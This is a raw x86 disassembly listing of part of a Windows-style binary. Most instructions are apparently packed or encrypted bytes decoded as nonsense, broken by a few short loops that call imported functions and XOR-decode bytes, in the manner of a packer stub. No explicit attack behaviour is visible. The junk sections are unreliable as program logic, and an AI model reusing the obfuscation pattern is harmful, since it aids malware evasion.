  407066:	xor    dl,BYTE PTR ss:[edi]
  407069:	dec    DWORD PTR [esi]
  40706b:	sub    BYTE PTR [ebx],0xa8
  40706e:	ss xor esp,ebx
  407071:	and    ebx,DWORD PTR [edi]
  407073:	dec    eax
  407074:	lods   al,BYTE PTR ds:[esi]
  407075:	adc    dl,BYTE PTR [ebx+0xdcca9c5]
  40707b:	xchg   DWORD PTR [eax],ecx
  40707d:	mov    dh,0x9c
  40707f:	jp     0x407040
  407081:	test   BYTE PTR [esi-0x2b],cl
  407084:	ins    BYTE PTR es:[edi],dx
  407085:	sub    eax,0xb88df34d
  40708a:	scas   al,BYTE PTR es:[edi]
  40708b:	cwde   
  40708c:	mov    dh,0xf2
  40708e:	aad    0x2d
  407090:	(bad)  
  407091:	xchg   DWORD PTR [ebp-0x1f],esp
  407094:	out    0xcf,eax
  407096:	in     al,0x12
  407098:	pop    es
  407099:	xchg   ecx,eax
  40709a:	push   ds
  40709b:	les    ebx,FWORD PTR [edi+0x17b5ec1a]
  4070a1:	mov    ebx,DWORD PTR [ebx]
  4070a3:	gs out 0x2,eax
  4070a6:	outs   dx,BYTE PTR ds:[esi]
  4070a7:	repz clc 
  4070a9:	and    esi,eax
  4070ab:	int    0xfc
  4070ad:	adc    eax,0xe858763a
  4070b2:	add    al,0x19
  4070b4:	(bad)  
  4070b5:	sub    bl,bh
  4070b7:	retf   
  4070b8:	mov    db5,edi
  4070bb:	jp     0x407115
  4070bd:	pop    edi
  4070be:	or     dh,BYTE PTR [eax+0x585bb6ae]
  4070c4:	je     0x4070b1
  4070c6:	xchg   ecx,eax
  4070c7:	cs push edx
  4070c9:	aad    0xfd
  4070cb:	cmc    
  4070cc:	aad    0xa6
  4070ce:	out    0x46,al
  4070d0:	es jmp 0x83ffacc8
  4070d6:	add    eax,0x2ce803bb
  4070db:	icebp  
  4070dc:	outs   dx,BYTE PTR ds:[esi]
  4070dd:	popa   
  4070de:	dec    edi
  4070df:	adc    ah,ah
  4070e1:	outs   dx,DWORD PTR ds:[esi]
  4070e2:	test   DWORD PTR [edi],edx
  4070e4:	ins    BYTE PTR es:[edi],dx
  4070e5:	push   ss
  4070e6:	and    al,0xf
  4070e8:	xchg   esi,eax
  4070e9:	cmp    ah,BYTE PTR [edx]
  4070eb:	push   ss
  4070ec:	cs lock sub al,al
  4070f0:	xchg   edi,eax
  4070f1:	inc    ecx
  4070f2:	lahf   
  4070f3:	xor    eax,0x2336ba0c
  4070f8:	add    BYTE PTR [esi-0x3eddf26a],bh
  4070fe:	aad    0x54
  407100:	xchg   esp,ebp
  407102:	fsubr  st(2),st
  407104:	sbb    eax,0xaf57f914
  407109:	pop    edi
  40710a:	sahf   
  40710b:	or     cl,BYTE PTR [ebx]
  40710d:	leave  
  40710e:	lods   al,BYTE PTR ds:[esi]
  40710f:	rcl    BYTE PTR [esi+0x78],1
  407112:	int    0x5c
  407114:	stos   BYTE PTR es:[edi],al
  407115:	xchg   ebx,eax
  407116:	pusha  
  407117:	out    0xb9,eax
  407119:	sbb    eax,0xcf704b66
  40711e:	mov    bh,0x27
  407120:	je     0x4070f4
  407122:	pop    ebx
  407123:	(bad)  
  407124:	mov    ah,0x5
  407126:	or     BYTE PTR [edx-0x1d908f94],0x8f
  40712d:	jnp    0x4070fd
  40712f:	imul   ebx,DWORD PTR [ecx+0x64],0x6ab5d92d
  407136:	adc    DWORD PTR [eax+0x3381f345],ebx
  40713c:	push   es
  40713d:	dec    ebx
  40713e:	les    ecx,FWORD PTR [ebx+0x1a]
  407141:	sbb    esi,ebx
  407143:	or     BYTE PTR [edi+0x4f],bh
  407146:	stos   BYTE PTR es:[edi],al
  407147:	inc    eax
  407148:	in     al,0x52
  40714a:	aam    0xf6
  40714c:	out    0x5c,eax
  40714e:	mov    edi,0xa238fffa
  407153:	sbb    edi,DWORD PTR [edx]
  407155:	es popf 
  407157:	sbb    eax,0xadcd7f7f
  40715c:	imul   edi,DWORD PTR [esi+0x46]
  407160:	adc    DWORD PTR [edx],0xd8136a44
  407166:	sub    ecx,DWORD PTR [ecx-0x3e741d28]
  40716c:	sbb    al,0xaf
  40716e:	xchg   eax,ebp
  407170:	sar    BYTE PTR [esi-0x26],1
  407173:	cli    
  407174:	dec    edx
  407175:	std    
  407176:	out    0x14,al
  407178:	add    bh,BYTE PTR [ebx+0x1bacd78d]
  40717e:	and    edx,DWORD PTR [ebp+edx*2-0x5e]
  407182:	xchg   edi,eax
  407183:	and    DWORD PTR [ebx],edx
  407185:	(bad)  
  407186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407187:	addr16 fs pop ebp
  40718a:	imul   ebx,DWORD PTR [esi+0x1f],0xd2b8e5c7
  407191:	aaa    
  407192:	pop    ds
  407193:	pop    ebp
  407194:	jo     0x4071d9
  407196:	std    
  407197:	jge    0x4071bf
  407199:	add    eax,0xc2a7e812
  40719e:	jmp    0x91aa8601
  4071a3:	cmp    bl,BYTE PTR [eax+eax*1]
  4071a6:	and    dh,BYTE PTR [edi+0x2ed5b1b9]
  4071ac:	outs   dx,DWORD PTR ds:[esi]
  4071ad:	ret    0x6eaf
  4071b0:	pxor   mm1,QWORD PTR [ecx-0x41]
  4071b4:	xchg   BYTE PTR ds:0x60175f46,ah
  4071ba:	idiv   BYTE PTR [edx+ecx*1+0x47]
  4071be:	inc    esi
  4071bf:	scas   eax,DWORD PTR es:[edi]
  4071c0:	icebp  
  4071c1:	pusha  
  4071c2:	aas    
  4071c3:	jae    0x407167
  4071c5:	sbb    BYTE PTR [ebx+0xe941b71],al
  4071cb:	int    0x1d
  4071cd:	sub    dh,al
  4071cf:	xor    DWORD PTR ds:0xaad3302d,0x94397e97
  4071d9:	(bad)
  4071dc:	pop    edx
  4071dd:	jg     0x407211
  4071df:	aam    0xb2
  4071e1:	jb     0x4071e5
  4071e3:	loop   0x407190
  4071e5:	sub    BYTE PTR [eax+0xa],al
  4071e8:	repz out 0x6a,eax
  4071eb:	cli    
  4071ec:	or     ebp,DWORD PTR [esi-0x59ec8366]
  4071f2:	add    DWORD PTR [edx],esi
  4071f4:	pushf  
  4071f5:	out    0x77,al
  4071f7:	jnp    0x4071ce
  4071f9:	test   eax,0x352e451a
  4071fe:	jmp    0x1846:0xa970bd
  407205:	dec    eax
  407206:	jecxz  0x4071ae
  407208:	repnz stos DWORD PTR es:[edi],eax
  40720a:	sar    BYTE PTR [ecx],0x2
  40720d:	xchg   DWORD PTR [edx],esp
  40720f:	ror    DWORD PTR [ecx+0x5107d579],1
  407215:	popa   
  407216:	mov    bl,0x88
  407218:	jl     0x4071cb
  40721a:	sbb    BYTE PTR [ebp+0x6f],ch
  40721d:	dec    esi
  40721e:	(bad)  
  40721f:	ins    DWORD PTR es:[edi],dx
  407220:	mov    esi,esp
  407222:	mov    edx,0x5ee0ff34
  407227:	in     al,dx
  407228:	cmp    al,0x29
  40722a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40722b:	shr    BYTE PTR gs:[ecx-0x1d],cl
  40722f:	sub    BYTE PTR [edx+0x59],ch
  407232:	sbb    esp,DWORD PTR [ebp+0x1cdf8ac2]
  407238:	cld    
  407239:	mov    cl,0x62
  40723b:	fisubr WORD PTR [edi+0x3f]
  40723e:	add    ah,BYTE PTR [edi-0x54]
  407241:	pop    edx
  407242:	adc    edi,DWORD PTR [edi]
  407244:	sbb    esp,edi
  407246:	dec    edi
  407247:	aas    
  407248:	loop   0x407263
  40724a:	or     bl,BYTE PTR [eax-0x30a13772]
  407250:	pop    esi
  407251:	fcomp  QWORD PTR [ebx+ecx*4+0x10d384e3]
  407258:	mov    ds:0xf7dbbed,al
  40725d:	out    0x89,eax
  40725f:	ss loope 0x407260
  407262:	and    eax,0x7f151414
  407267:	setne  BYTE PTR [edi+0x53]
  40726b:	fbstp  TBYTE PTR [esi-0x6f8bba17]
  407271:	push   ss
  407272:	in     al,dx
  407273:	dec    esi
  407274:	push   cs
  407275:	mov    edi,0x4c78aca6
  40727a:	adc    DWORD PTR [ebp+0x65],eax
  40727d:	rol    edi,cl
  40727f:	xchg   dl,dh
  407281:	das    
  407282:	mov    bl,0x84
  407284:	push   ecx
  407285:	xor    dh,BYTE PTR [esi]
  407287:	sub    al,BYTE PTR [esi]
  407289:	mov    edx,0x1d36127d
  40728e:	adc    dh,BYTE PTR [ebx-0x58]
  407291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407292:	or     eax,ecx
  407294:	mov    bl,0xc0
  407296:	into   
  407297:	push   edx
  407298:	in     eax,dx
  407299:	push   ebx
  40729a:	xor    edx,DWORD PTR [eax-0x1361a208]
  4072a0:	bound  esp,QWORD PTR [edi-0x5d]
  4072a3:	call   0x244aab7d
  4072a8:	adc    bh,BYTE PTR [edi-0x2ecf8674]
  4072ae:	mov    edi,DWORD PTR [ebx-0x7a9a2789]
  4072b4:	mov    dh,0xb2
  4072b6:	(bad)  [ebx]
  4072b8:	call   0xc5adccd7
  4072bd:	ret    
  4072be:	mov    WORD PTR [ebp-0x63],?
  4072c1:	iret   
  4072c2:	mov    esp,eax
  4072c4:	xchg   ebx,eax
  4072c5:	mov    eax,ds:0x709bf528
  4072ca:	pop    es
  4072cb:	icebp  
  4072cc:	out    0x7d,eax
  4072ce:	sub    al,0xcf
  4072d0:	std    
  4072d1:	popa   
  4072d2:	mov    ecx,0x8381c4ad
  4072d7:	fstp   QWORD PTR [ecx+0xcc36b6b]
  4072dd:	iret   
  4072de:	rol    edx,0x28
  4072e1:	or     BYTE PTR [eax+0x33],bl
  4072e4:	(bad)  
  4072e5:	mov    ds:0x16090058,al
  4072ea:	pop    ss
  4072eb:	push   ss
  4072ec:	dec    ebp
  4072ed:	ins    DWORD PTR es:[edi],dx
  4072ee:	test   BYTE PTR ds:0xf223f768,0xb8
  4072f5:	jecxz  0x4072d1
  4072f7:	aaa    
  4072f8:	enter  0x858b,0xd
  4072fc:	ja     0x40731d
  4072fe:	pusha  
  4072ff:	nop
  407300:	stos   DWORD PTR es:[edi],eax
  407301:	push   0xffffffa6
  407303:	(bad)  
  407304:	(bad)  
  407305:	push   ss
  407306:	xchg   ebx,eax
  407307:	loop   0x4072fb
  407309:	jle    0x4072f0
  40730b:	std    
  40730c:	lds    esi,FWORD PTR [ecx+0x77]
  40730f:	aaa    
  407310:	sbb    DWORD PTR [esi+0xb],esp
  407313:	shl    BYTE PTR [ebx],0x2f
  407316:	mov    fs,WORD PTR [ebp+esi*4+0x35]
  40731a:	test   DWORD PTR [edi],edi
  40731c:	mov    bl,ch
  40731e:	inc    eax
  40731f:	xchg   ebp,eax
  407320:	dec    eax
  407321:	adc    DWORD PTR [edx+0x7fff45c6],ebp
  407327:	lea    eax,[ebp-0x1]
  40732a:	and    DWORD PTR ds:0x42a799,0x0
  407334:	jmp    0x407346
  407339:	mov    ecx,DWORD PTR ds:0x42a799
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a799,ecx
  407346:	cmp    DWORD PTR ds:0x42a799,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a799,0x4
  40735a:	jne    0x407378
  407360:	push   0x42a8a9
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a799,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a799
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a799,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0xa9abb6f0,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x407412
  4073b7:	fcomp  QWORD PTR [edi]
  4073b9:	mov    eax,0x65c84782
  4073be:	into   
  4073bf:	cmp    eax,0xe7e7b025
  4073c4:	(bad)  
  4073c5:	jne    0x4073c3
  4073c7:	pop    es
  4073c8:	mov    dl,BYTE PTR [ecx+ebp*4]
  4073cb:	in     eax,dx
  4073cc:	icebp  
  4073cd:	loop   0x4073f4
  4073cf:	mov    esp,esp
  4073d1:	jmp    0xd086e9a4
  4073d6:	dec    edx
  4073d7:	adc    ebp,DWORD PTR [ebp+0x4ece9ab1]
  4073dd:	ja     0x4073fc
  4073df:	imul   edi,edi,0xd91628e6
  4073e5:	mov    dh,0x71
  4073e7:	pop    ebp
  4073e8:	xchg   esp,eax
  4073e9:	push   ecx
  4073ea:	mov    fs,WORD PTR [eax+0x2e]
  4073ed:	dec    edi
  4073ee:	push   edx
  4073ef:	mov    dh,0x1c
  4073f1:	dec    edi
  4073f2:	cs jb  0x407443
  4073f5:	mov    al,ds:0x6202751c
  4073fa:	stos   DWORD PTR es:[edi],eax
  4073fb:	and    al,0x49
  4073fd:	nop
  4073fe:	xchg   esi,eax
  4073ff:	add    BYTE PTR [ebx+0x1d],al
  407402:	jp     0x4073b0
  407404:	dec    eax
  407405:	sub    bh,BYTE PTR [edi+0x679975a2]
  40740b:	pop    ss
  40740c:	add    DWORD PTR [esi+0x73],0xffffffc3
  407410:	sbb    DWORD PTR [edi-0x5d],edx
  407413:	or     al,0xb3
  407415:	xor    DWORD PTR [ecx-0x1a120f26],esp
  40741b:	mov    DWORD PTR [edx-0x4077fdcc],eax
  407421:	in     al,0x10
  407423:	in     eax,dx
  407424:	pop    ebx
  407425:	push   es
  407426:	jns    0x4073a9
  407428:	xor    al,0x2b
  40742a:	cli    
  40742b:	jmp    0x92c9:0x6b08fc51
  407432:	out    0xb1,al
  407434:	xor    al,0xe8
  407436:	sbb    al,0xa7
  407438:	in     al,dx
  407439:	fsub   QWORD PTR [ebp-0x5b]
  40743c:	fmul   DWORD PTR [edi-0x2332213c]
  407442:	xabort 0xe0
  407445:	fbstp  TBYTE PTR [esi+0x11]
  407448:	lds    esi,FWORD PTR [edx+0x40b7fdc1]
  40744e:	add    ah,BYTE PTR [edx+0xcf1b6f8]
  407454:	out    0xae,al
  407456:	icebp  
  407457:	xchg   edi,eax
  407458:	jno    0x4074c3
  40745a:	sbb    BYTE PTR [edx+0x5c9d207b],cl
  407460:	call   0xf73:0x8f9a4ce2
  407467:	pop    esi
  407468:	jmp    0x407433
  40746a:	push   ebx
  40746b:	inc    ebx
  40746c:	les    esi,FWORD PTR [ebx+ebx*4+0x48d68b39]
  407473:	adc    BYTE PTR [esi+esi*8+0x4cb90dba],bl
  40747a:	fisubr WORD PTR [ecx+esi*8+0x1f]
  40747e:	adc    DWORD PTR [ecx-0x6],0x4c04d345
  407485:	loope  0x407426
  407487:	cdq    
  407488:	dec    esp
  407489:	push   cs
  40748a:	jmp    0x407505
  40748c:	ficomp DWORD PTR [edx]
  40748e:	xchg   dh,ch
  407490:	jne    0x4074f6
  407492:	rol    BYTE PTR [edx+0x5],0x38
  407496:	mov    DWORD PTR [esi-0x72],esp
  407499:	dec    eax
  40749a:	mov    ah,BYTE PTR [ebx+0x30]
  40749d:	mov    al,ds:0x2ec0d1c2
  4074a2:	les    eax,FWORD PTR [edi+0x3e34930d]
  4074a8:	lods   eax,DWORD PTR ds:[esi]
  4074a9:	push   edx
  4074aa:	(bad)  
  4074ab:	jmp    0x407511
  4074ad:	mov    DWORD PTR [eax+0x6d],ecx
  4074b0:	mov    esi,0x44326f46
  4074b5:	int    0xfc
  4074b7:	cs fwait
  4074b9:	out    dx,al
  4074ba:	push   esp
  4074bb:	int3   
  4074bc:	ret    
  4074bd:	mov    al,0x4b
  4074bf:	jae    0x4074c6
  4074c1:	into   
  4074c2:	inc    eax
  4074c3:	loop   0x40750b
  4074c5:	retf   
  4074c6:	leave  
  4074c7:	fdivr  st(6),st
  4074c9:	xor    ebx,DWORD PTR [ebx-0x79df8ef7]
  4074cf:	pusha  
  4074d0:	sbb    al,0x89
  4074d2:	mov    dh,0x61
  4074d4:	in     al,dx
  4074d5:	int3   
  4074d6:	fld    DWORD PTR [ebp-0x461b1665]
  4074dc:	add    eax,0x1e114a46
  4074e1:	in     al,dx
  4074e2:	shr    bh,0x1e
  4074e5:	and    eax,0x18e38f0a
  4074ea:	jge    0x91752176
  4074f0:	popa   
  4074f1:	pop    esi
  4074f2:	fiadd  WORD PTR [edx-0x3d179344]
  4074f8:	jae    0x407573
  4074fa:	and    ebx,DWORD PTR [ecx-0x8]
  4074fd:	or     eax,0xcfd553b2
  407502:	mov    bl,0xc2
  407504:	pop    es
  407505:	xchg   dl,cl
  407507:	xchg   BYTE PTR [ecx+ebp*4],al
  40750a:	push   esi
  40750b:	cdq    
  40750c:	mov    eax,0x68e5bcda
  407511:	sbb    ah,BYTE PTR [ebx]
  407513:	push   edi
  407514:	retf   0xe71d
  407517:	dec    esi
  407518:	test   DWORD PTR [edx+0x68245929],0x66d0d149
  407522:	mov    eax,ds:0xabc063b8
  407527:	pop    edi
  407528:	xchg   esp,eax
  407529:	fidivr DWORD PTR [edx]
  40752b:	jmp    0x6ae14b84
  407530:	jbe    0x4074fa
  407532:	jmp    0xa7d155bd
  407537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407538:	scas   al,BYTE PTR es:[edi]
  407539:	ficomp DWORD PTR [eax]
  40753b:	or     BYTE PTR [ebx-0x4d450134],0xc0
  407542:	push   ebx
  407543:	aad    0x9
  407545:	jne    0x40757a
  407547:	jecxz  0x4075b6
  407549:	repz mov edi,0xf3baea85
  40754f:	adc    dl,dl
  407551:	mov    edi,0x5f679202
  407556:	mov    eax,ds:0xd95081f2
  40755b:	stos   BYTE PTR es:[edi],al
  40755c:	mov    esi,0x5ce425f0
  407561:	jge    0x407508
  407563:	aad    0xf5
  407565:	adc    DWORD PTR ds:0x4b6cc254,0x3fd5214d
  40756f:	xchg   ebx,eax
  407570:	dec    ecx
  407571:	or     ebx,DWORD PTR [ebx]
  407573:	mov    esp,0xcc7218de
  407578:	push   ds
  407579:	(bad)  
  40757b:	(bad)
  40757e:	sahf   
  40757f:	jecxz  0x407524
  407581:	mov    fs,WORD PTR [edi-0x40]
  407584:	clc    
  407585:	call   0x1932:0x4aa457a1
  40758c:	push   ss
  40758d:	in     eax,dx
  40758e:	xor    BYTE PTR [edi-0x38],bl
  407591:	lods   eax,DWORD PTR ds:[esi]
  407592:	fwait
  407593:	enter  0x66cf,0x89
  407597:	xchg   DWORD PTR [ebp+0x51b4250a],ebp
  40759d:	imul   eax,DWORD PTR [ecx-0x3ddbee76],0x1dca8781
  4075a7:	mov    ch,0xfe
  4075a9:	aad    0x7d
  4075ab:	hlt    
  4075ac:	test   BYTE PTR [eax+0x26ca5454],ah
  4075b2:	sub    eax,0x189ea237
  4075b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075b8:	cli    
  4075b9:	mov    edi,0x512f6d12
  4075be:	inc    ebp
  4075bf:	mov    ds:0xdb614563,eax
  4075c4:	jb     0x40754c
  4075c6:	xchg   esi,eax
  4075c7:	repz fild WORD PTR [edx]
  4075ca:	in     al,0xb7
  4075cc:	or     al,0xcb
  4075ce:	fcomp  st(6)
  4075d0:	sbb    DWORD PTR [ebp-0x7b0b6f21],0xfffffff2
  4075d7:	lods   eax,DWORD PTR ds:[esi]
  4075d8:	pop    es
  4075d9:	sbb    DWORD PTR [edi],ebx
  4075db:	fisub  DWORD PTR [ecx]
  4075dd:	out    dx,al
  4075de:	test   DWORD PTR [ebp+0x22],edx
  4075e1:	les    edi,FWORD PTR [ebx*4+0x1254d875]
  4075e8:	adc    al,BYTE PTR [ecx]
  4075ea:	jae    0x407585
  4075ec:	test   DWORD PTR [eax+0x3f23aedb],edi
  4075f2:	in     eax,0xf8
  4075f4:	aam    0x44
  4075f6:	std    
  4075f7:	add    BYTE PTR [edx-0x55984144],ch
  4075fd:	push   ecx
  4075fe:	mov    al,ds:0x67b4ab59
  407603:	pop    ds
  407604:	mov    ebp,0x32bac275
  407609:	xor    BYTE PTR [eax+0x317b9717],bl
  40760f:	test   DWORD PTR [esi+0x44929452],edi
  407615:	es pop edi
  407617:	mov    DWORD PTR [ecx-0x9],esi
  40761a:	sub    eax,0x9523cac0
  40761f:	sub    dh,ch
  407621:	loope  0x407644
  407623:	iret   
  407624:	mov    cl,0xdb
  407626:	aad    0x5f
  407628:	jge    0x40767e
  40762a:	loope  0x4075b8
  40762c:	inc    esp
  40762d:	fbld   TBYTE PTR [edx+0x12]
  407630:	lods   eax,DWORD PTR ds:[esi]
  407631:	cmp    esi,DWORD PTR [edx]
  407633:	push   edx
  407634:	adc    BYTE PTR [esi+0x64],bl
  407637:	mov    WORD PTR [edi-0x56],fs
  40763a:	push   ecx
  40763b:	ret    0x1035
  40763e:	push   ds
  40763f:	inc    esp
  407640:	shl    BYTE PTR [ebx+eiz*8],1
  407643:	and    al,0x74
  407645:	daa    
  407646:	leave  
  407647:	jg     0x40767d
  407649:	test   BYTE PTR [esi+0x48],ah
  40764c:	lods   al,BYTE PTR ds:[esi]
  40764d:	in     eax,0x7c
  40764f:	ds (bad) 
  407651:	stc    
  407652:	retf   
  407653:	lea    eax,[ecx+0x5d05f470]
  407659:	dec    edi
  40765a:	xor    DWORD PTR [edi+ebx*4+0x4],esi
  40765e:	mov    DWORD PTR [ebp-0x7],ebp
  407661:	in     eax,0xdb
  407663:	aad    0x26
  407665:	scas   eax,DWORD PTR es:[edi]
  407666:	cmp    edi,ebx
  407668:	adc    DWORD PTR [ebx-0x4033d51],0x3
  40766f:	mov    bh,dl
  407671:	mov    ch,0x84
  407673:	mov    ds,WORD PTR [edx+0x58c10fb4]
  407679:	lahf   
  40767a:	test   al,0xd6
  40767c:	and    eax,0x4b5d420a
  407681:	inc    edi
  407682:	add    bh,cl
  407684:	(bad)  
  407685:	jge    0x4076d8
  407687:	shr    DWORD PTR [edx],0xf
  40768a:	push   ss
  40768b:	std    
  40768c:	lods   al,BYTE PTR ds:[esi]
  40768d:	push   edx
  40768e:	or     eax,0xd8a1b14
  407693:	leave  
  407694:	pop    ecx
  407695:	sub    ecx,DWORD PTR [esp+ebx*8]
  407698:	inc    edi
  407699:	aaa    
  40769a:	fld    DWORD PTR [ebp-0x32]
  40769d:	mov    dl,0x72
  40769f:	fnstsw WORD PTR [edx-0x1f]
  4076a2:	mov    DWORD PTR [ebp-0x10],eax
  4076a5:	mov    al,BYTE PTR [ebp-0x1]
  4076a8:	or     DWORD PTR ds:0x42a781,0x6cf8
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42a85d,0x42a79d
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42a7d9,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42a7d9
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42a7d9,ecx
  4076e8:	cmp    DWORD PTR ds:0x42a7d9,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42a7d9,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42a7d9,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42a7d9
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42a7d9,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx+0x6fae76e8],1
  407796:	and    cl,ah
  407798:	mov    esi,0x7878d6b0
  40779d:	fs jle 0x407818
  4077a0:	js     0x4077e6
  4077a2:	dec    esi
  4077a3:	adc    al,0xd8
  4077a5:	pcmpgtd mm0,QWORD PTR [eax]
  4077a8:	mov    eax,ds:0xe384de70
  4077ad:	icebp  
  4077ae:	clc    
  4077af:	sbb    ch,BYTE PTR [ebx-0x19950683]
  4077b5:	push   esi
  4077b6:	int3   
  4077b7:	push   cs
  4077b8:	jmp    0x867363eb
  4077bd:	mov    bl,0xc9
  4077bf:	and    eax,DWORD PTR [ecx]
  4077c1:	or     dl,BYTE PTR [esi-0x59917969]
  4077c7:	and    eax,0x1c5bef97
  4077cc:	ins    DWORD PTR es:[edi],dx
  4077cd:	outs   dx,DWORD PTR ds:[esi]
  4077ce:	add    edi,DWORD PTR ds:0xd3c35a4
  4077d4:	and    DWORD PTR [ebx],edi
  4077d6:	pop    ebx
  4077d7:	retf   0x9b89
  4077da:	dec    ecx
  4077db:	(bad)  
  4077dd:	jmp    0x7ac8:0x2640a714
  4077e4:	adc    al,0xf2
  4077e6:	dec    ebx
  4077e7:	mov    esp,0x1817b7fb
  4077ec:	adc    al,0x7
  4077ee:	icebp  
  4077ef:	ret    0x35b6
  4077f2:	daa    
  4077f3:	imul   DWORD PTR [edx]
  4077f5:	xchg   edx,eax
  4077f6:	mov    bl,BYTE PTR [edx]
  4077f8:	dec    edi
  4077f9:	fwait
  4077fa:	mov    eax,ds:0x5c811fe1
  4077ff:	adc    esi,DWORD PTR [eax-0x7]
  407802:	mov    ds:0xb438d46f,al
  407807:	mov    eax,ds:0x10148b5f
  40780c:	jle    0x407872
  40780e:	mov    ebp,0x100637ea
  407813:	ret    
  407814:	adc    bl,BYTE PTR [edi+0x3f]
  407817:	pop    ebx
  407818:	add    ebp,DWORD PTR [eax-0x12]
  40781b:	out    0x52,eax
  40781d:	xchg   esp,eax
  40781e:	lods   eax,DWORD PTR ds:[esi]
  40781f:	(bad)  
  407821:	fwait
  407822:	repz mov al,ds:0xb44e08b6
  407828:	aas    
  407829:	(bad)  
  40782a:	pop    ebp
  40782b:	mov    ds:0xa8fc60b4,eax
  407830:	and    BYTE PTR [edi-0x23],0x3a
  407834:	out    0x9,al
  407836:	pop    esi
  407837:	mov    edx,esi
  407839:	cmove  ecx,DWORD PTR [ecx-0x36c26e3b]
  407840:	mov    al,0x40
  407842:	ret    
  407843:	cld    
  407844:	inc    ecx
  407845:	pop    ebx
  407846:	call   0xaa55b971
  40784b:	push   ss
  40784c:	xchg   esi,eax
  40784d:	js     0x40784e
  40784f:	mov    edx,0x8294ad06
  407854:	adc    DWORD PTR [edi+edx*4+0x604b993c],esi
  40785b:	adc    dl,bh
  40785d:	stos   DWORD PTR es:[edi],eax
  40785e:	lods   eax,DWORD PTR ds:[esi]
  40785f:	push   ebx
  407860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407861:	pop    ebx
  407862:	scas   eax,DWORD PTR es:[edi]
  407863:	loop   0x40786f
  407865:	dec    esi
  407866:	dec    edi
  407867:	lea    esp,[edi+0x33]
  40786a:	adc    dh,BYTE PTR [ecx+0x39]
  40786d:	pop    es
  40786e:	sbb    eax,0x99f8e107
  407873:	pusha  
  407874:	push   edx
  407875:	nop
  407876:	aas    
  407877:	je     0x40780f
  407879:	retf   
  40787a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40787b:	ja     0x4078a3
  40787d:	mov    WORD PTR [esi+0x11],es
  407880:	mov    DWORD PTR [eax-0x31bec205],ecx
  407886:	dec    edx
  407887:	push   0x33
  407889:	icebp  
  40788a:	or     eax,esp
  40788c:	sbb    BYTE PTR [eax-0x43d5a591],bh
  407892:	fst    QWORD PTR [ebp+0x3c]
  407895:	sbb    DWORD PTR [edi],ebx
  407897:	jmp    0xb51d:0x475d9e04
  40789e:	and    BYTE PTR [ecx+eiz*8-0x5d17bdca],bh
  4078a5:	mov    edx,0x10b0b1dc
  4078aa:	daa    
  4078ab:	cli    
  4078ac:	jo     0x4078de
  4078ae:	and    edi,DWORD PTR [ebx-0x26c05f48]
  4078b4:	xchg   edi,eax
  4078b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078b6:	mov    al,0x8f
  4078b8:	dec    ebp
  4078b9:	ja     0x40792a
  4078bb:	xor    al,0xb6
  4078bd:	pop    ebp
  4078be:	fwait
  4078bf:	xor    dl,al
  4078c1:	sub    eax,0x6f49e03d
  4078c6:	in     eax,0x95
  4078c8:	cmp    BYTE PTR ds:0xd8fc4f33,al
  4078ce:	mov    ebp,0x1b9fa4a6
  4078d3:	xor    DWORD PTR [edx+0x1c14b713],0xffffffe3
  4078da:	inc    edi
  4078db:	lds    edx,FWORD PTR [ebx+0x78837d45]
